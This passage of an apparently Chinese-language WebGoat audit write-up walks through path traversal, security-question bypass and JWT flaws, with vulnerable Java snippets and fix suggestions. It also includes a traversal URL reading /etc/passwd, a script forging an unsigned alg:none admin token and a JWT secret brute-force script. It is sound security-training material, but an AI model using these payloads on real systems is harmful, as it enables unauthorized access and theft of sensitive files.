&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; AttackResult &lt;span class=&#34;title&#34;&gt;uploadFileHandler&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(            &lt;span class=&#34;meta&#34;&gt;@RequestParam(&amp;quot;uploadedFileFix&amp;quot;)&lt;/span&gt; MultipartFile file,            &lt;span class=&#34;meta&#34;&gt;@RequestParam(value = &amp;quot;fullNameFix&amp;quot;, required = false)&lt;/span&gt; String fullName)&lt;/span&gt; &lt;/span&gt;&amp;#123;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;super&lt;/span&gt;.execute(file, fullName != &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt; ? fullName.replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;../&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) : &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;);    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt04.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;path-traversal–&amp;gt;ProfileUploadRemoveUserInput&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;直接使用了源文件名，所以直接修改文件名即可，建议随机重命名文件名&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; AttackResult &lt;span class=&#34;title&#34;&gt;uploadFileHandler&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;meta&#34;&gt;@RequestParam(&amp;quot;uploadedFileRemoveUserInput&amp;quot;)&lt;/span&gt; MultipartFile file)&lt;/span&gt; &lt;/span&gt;&amp;#123;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;super&lt;/span&gt;.execute(file, file.getOriginalFilename());    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt06.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;目录遍历&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录遍历&#34;&gt;#&lt;/a&gt; 目录遍历&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-3&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;路径遍历，即利用路径回溯符 “…/” 跳出程序本身的限制目录实现下载任意文件。例如 Web 应用源码目录、Web 应用配置文件、敏感的系统文件（/etc/passwd、/etc/paswd）等。&lt;/p&gt;
&lt;p&gt;一个正常的 Web 功能请求：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.test.com/get-files.jsp?file=report.pdf&#34;&gt;http://www.test.com/get-files.jsp?file=report.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果 Web 应用存在路径遍历漏洞，则攻击者可以构造以下请求服务器敏感文件：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd&#34;&gt;http://www.test.com/get-files.jsp?file=../../../../../../../../../../../../etc/passwd&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-3&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;未对用户输入的参数进行合法性验证&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-3&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;p&gt;path-traversal–&amp;gt;ProfileUploadRetrieval&lt;/p&gt;
&lt;p&gt;源码过滤了’…‘和’/’，但是可以通过 url 编码进行绕过&lt;/p&gt;
&lt;p&gt;根据参数 id 进行判断&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt08.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果用户输入的 id.jpg 存在，那么返回包中返回该图片的 base64 编码&lt;/p&gt;
&lt;p&gt;如果不存在，就返回 catPicturesDirectory 的父目录的所有文件信息，用逗号分割&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt09.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt07.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 使用适当的权限保护文件夹2. 禁止返回目录信息3. 对url编码后的参数也要进行解码过滤4. 统一404界面
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;身份认证绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#身份认证绕过&#34;&gt;#&lt;/a&gt; 身份认证绕过&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-4&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;业务流程由前端进行控制，服务器端对应的各功能分离，导致业务流程可被攻击者进行控制，从而绕过流程中的各项校验功能，达到攻击的目的。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-4&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;未对用户可控的参数进行合法性验证&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-4&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;auth-bypass–&amp;gt;VerifyAccount.completed()&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (verificationHelper.didUserLikelylCheat((HashMap) submittedAnswers)) &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;)                    .feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;verify-account.cheated&amp;quot;&lt;/span&gt;)                    .output(&lt;span class=&#34;string&#34;&gt;&amp;quot;Yes, you guessed correctly, but see the feedback message&amp;quot;&lt;/span&gt;)                    .build();        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;调用 verificationHelper.didUserLikelylCheat ()&lt;/p&gt;
&lt;p&gt;将用户输入的问题用键值对的方式保存，并和后端代码存储的答案进行比较。&lt;/p&gt;
&lt;p&gt;但是 Mapper 在 get 一个不存在的键时，并不会报错，而是返回 null。所以用户可以通过控制 key 的值绕过。&lt;/p&gt;
&lt;p&gt;建议&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;若用户可控 key，那么应该先判断这个 key 是否合法&lt;/li&gt;
&lt;li&gt;设置不可控 key，直接将用户的输入作为 value 进行判断&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &amp;#123;        userSecQuestions.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;secQuestion0&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Dr. Watson&amp;quot;&lt;/span&gt;);        userSecQuestions.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;secQuestion1&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Baker Street&amp;quot;&lt;/span&gt;);    &amp;#125;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map&amp;lt;Integer, Map&amp;gt; secQuestionStore = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;&amp;gt;();    &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &amp;#123;        secQuestionStore.put(verifyUserId, userSecQuestions);    &amp;#125;    &lt;span class=&#34;comment&#34;&gt;// end &amp;#x27;data store set up&amp;#x27;    // this is to aid feedback in the attack process and is not intended to be part of the &amp;#x27;vulnerable&amp;#x27; code    public boolean didUserLikelylCheat(HashMap&amp;lt;String, String&amp;gt; submittedAnswers) &amp;#123;        boolean likely = false;        if (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size()) &amp;#123;            likely = true;        &amp;#125;        if ((submittedAnswers.containsKey(&amp;quot;secQuestion0&amp;quot;) &amp;amp;&amp;amp; submittedAnswers.get(&amp;quot;secQuestion0&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion0&amp;quot;)))                &amp;amp;&amp;amp; (submittedAnswers.containsKey(&amp;quot;secQuestion1&amp;quot;) &amp;amp;&amp;amp; submittedAnswers.get(&amp;quot;secQuestion1&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion1&amp;quot;)))) &amp;#123;            likely = true;        &amp;#125; else &amp;#123;            likely = false;        &amp;#125;        return likely;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ap01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;auth-bypass–&amp;gt;AccountVerificationHelper.verifyAccount()&lt;/p&gt;
&lt;p&gt;判断了 key 是否存在，但是不包含该 key 仍然可以绕过&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//end of cheating check ... the method below is the one of real interest. Can you find the flaw?    public boolean verifyAccount(Integer userId, HashMap&amp;lt;String, String&amp;gt; submittedQuestions) &amp;#123;        //short circuit if no questions are submitted        if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &amp;#123;            return false;        &amp;#125;        if (submittedQuestions.containsKey(&amp;quot;secQuestion0&amp;quot;) &amp;amp;&amp;amp; !submittedQuestions.get(&amp;quot;secQuestion0&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion0&amp;quot;))) &amp;#123;            return false;        &amp;#125;        if (submittedQuestions.containsKey(&amp;quot;secQuestion1&amp;quot;) &amp;amp;&amp;amp; !submittedQuestions.get(&amp;quot;secQuestion1&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion1&amp;quot;))) &amp;#123;            return false;        &amp;#125;        // else        return true;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;建议修改为&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;false&lt;/span&gt;;        &amp;#125;&lt;span class=&#34;comment&#34;&gt;// 同时判断key和对应的value        if (submittedQuestions.containsKey(&amp;quot;secQuestion0&amp;quot;) &amp;amp;&amp;amp; submittedQuestions.get(&amp;quot;secQuestion0&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion0&amp;quot;)) &amp;amp;&amp;amp; submittedQuestions.containsKey(&amp;quot;secQuestion1&amp;quot;) &amp;amp;&amp;amp; submittedQuestions.get(&amp;quot;secQuestion1&amp;quot;).equals(secQuestionStore.get(verifyUserId).get(&amp;quot;secQuestion1&amp;quot;))) &amp;#123;            return true;        &amp;#125;        // else        return false;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;作者没写这个功能点，就是在源码里面问了一下&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;JWT&lt;/p&gt;
&lt;p&gt;jwt–&amp;gt;JWTVotesEndpoint.vote()&lt;/p&gt;
&lt;p&gt;没有验证签名，直接判断 token 中的 admin 对应值是否为 true，所以把 token 中的 alg 设置为 none，admin 设置为 true 即可（亲测 bp 转换的不行）&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (StringUtils.isEmpty(accessToken)) &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;jwt-invalid-token&amp;quot;&lt;/span&gt;).build();        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;                Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);                Claims claims = (Claims) jwt.getBody();                &lt;span class=&#34;keyword&#34;&gt;boolean&lt;/span&gt; isAdmin = Boolean.valueOf((String) claims.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;));                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!isAdmin) &amp;#123;                    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;jwt-only-admin&amp;quot;&lt;/span&gt;).build();                &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;                    votes.values().forEach(vote -&amp;gt; vote.reset());                    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; success(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).build();                &amp;#125;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (JwtException e) &amp;#123;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; failed(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).feedback(&lt;span class=&#34;string&#34;&gt;&amp;quot;jwt-invalid-token&amp;quot;&lt;/span&gt;).output(e.toString()).build();            &amp;#125;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;转换脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# -*- coding:utf-8 -*-import jwtimport base64# header# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9# &amp;#123;&amp;quot;typ&amp;quot;:&amp;quot;JWT&amp;quot;,&amp;quot;alg&amp;quot;:&amp;quot;HS256&amp;quot;&amp;#125;#payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &amp;#123;&amp;quot;iss&amp;quot;:&amp;quot;http:\/\/demo.sjoerdlangkemper.nl\/&amp;quot;,&amp;quot;iat&amp;quot;:1504006435,&amp;quot;exp&amp;quot;:1504006555,&amp;quot;data&amp;quot;:&amp;#123;&amp;quot;hello&amp;quot;:&amp;quot;world&amp;quot;&amp;#125;&amp;#125;def b64urlencode(data):    return base64.b64encode(data).replace(b&amp;#x27;+&amp;#x27;, b&amp;#x27;-&amp;#x27;).replace(b&amp;#x27;/&amp;#x27;, b&amp;#x27;_&amp;#x27;).replace(b&amp;#x27;=&amp;#x27;, b&amp;#x27;&amp;#x27;)print(b64urlencode(b&amp;#x27;&amp;#123;&amp;quot;alg&amp;quot;:&amp;quot;none&amp;quot;&amp;#125;&amp;#x27;)+b&amp;#x27;.&amp;#x27;+b64urlencode(b&amp;#x27;&amp;#123;&amp;quot;iat&amp;quot;:1673470025,&amp;quot;admin&amp;quot;:&amp;quot;true&amp;quot;,&amp;quot;user&amp;quot;:&amp;quot;Tom&amp;quot;&amp;#125;&amp;#x27;)+b&amp;#x27;.&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;jwt–&amp;gt;JWTSecretKeyEndpoint.login()&lt;/p&gt;
&lt;p&gt;随机取数组中的值进行加密，可以用字典进行爆破&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String[] SECRETS = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;victory&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;business&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;available&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;shipping&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;washington&amp;quot;&lt;/span&gt;&amp;#125;;&lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String JWT_SECRET = TextCodec.BASE64.encode(SECRETS[&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Random().nextInt(SECRETS.length)]);&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; String &lt;span class=&#34;title&#34;&gt;getSecretToken&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; Jwts.builder()                .setIssuer(&lt;span class=&#34;string&#34;&gt;&amp;quot;WebGoat Token Builder&amp;quot;&lt;/span&gt;)                .setAudience(&lt;span class=&#34;string&#34;&gt;&amp;quot;webgoat.org&amp;quot;&lt;/span&gt;)                .setIssuedAt(Calendar.getInstance().getTime())                .setExpiration(Date.from(Instant.now().plusSeconds(&lt;span class=&#34;number&#34;&gt;60&lt;/span&gt;)))                .setSubject(&lt;span class=&#34;string&#34;&gt;&amp;quot;tom@webgoat.org&amp;quot;&lt;/span&gt;)                .claim(&lt;span class=&#34;string&#34;&gt;&amp;quot;username&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Tom&amp;quot;&lt;/span&gt;)                .claim(&lt;span class=&#34;string&#34;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;tom@webgoat.org&amp;quot;&lt;/span&gt;)                .claim(&lt;span class=&#34;string&#34;&gt;&amp;quot;Role&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; String[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;Manager&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Project Administrator&amp;quot;&lt;/span&gt;&amp;#125;)                .signWith(SignatureAlgorithm.HS256, JWT_SECRET).compact();    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆破脚本（字典 pass.txt 用的是源码里面的数组）（如果脚本报错 jwt 找不到 jwt.exceptions，可能是 pyjwt 的问题，更新 pyjwt&amp;gt;=1.6.4 即可，&lt;a href=&#34;https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode&#34;&gt;解决来源&lt;/a&gt;）：&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; termcolorimport jwtif __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:    jwt_str = &lt;span class=&#34;string&#34;&gt;&amp;#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTc5ODAxNSwiZXhwIjoxNjExNzk4MDc1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.w1tzWDwmZcggbyV9ixcw1Vydf07MG9mAsPVbQPgBh2E&amp;#x27;&lt;/span&gt;    &lt;span class=&#34;function&#34;&gt;with &lt;span class=&#34;title&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;pass.txt&amp;#x27;&lt;/span&gt;)&lt;/span&gt; as f:        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; line in f:            key_ &lt;/span&gt;= line.strip()            &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:                jwt.decode(jwt_str, verify=True, key=key_, algorithms=&lt;span class=&#34;string&#34;&gt;&amp;quot;HS256&amp;quot;&lt;/span&gt;)                print(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\bbingo! found key --&amp;gt;&amp;#x27;&lt;/span&gt;, termcolor.colored(key_, &lt;span class=&#34;string&#34;&gt;&amp;#x27;green&amp;#x27;&lt;/span&gt;), &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;--&amp;#x27;&lt;/span&gt;)                &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;            &lt;span class=&#34;title&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError)&lt;/span&gt;:                &lt;span class=&#34;title&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\bbingo! found key --&amp;gt;&amp;#x27;&lt;/span&gt;, termcolor.colored(key_, &lt;span class=&#34;string&#34;&gt;&amp;#x27;green&amp;#x27;&lt;/span&gt;)&lt;/span&gt;, &amp;#x27;&amp;lt;--&amp;#x27;)                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;            except jwt.exceptions.InvalidSignatureError:                &lt;span class=&#34;title&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\r\btry&amp;#x27;&lt;/span&gt;, key_, end=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, flush=True)&lt;/span&gt;                &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:            &lt;span class=&#34;title&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\bsorry! no key be found.&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;爆破出来 key，就可以去 https://jwt.io/#debugger 加工啦&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt13.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;jwt–&amp;gt;JWTRefreshEndpoint&lt;/p&gt;
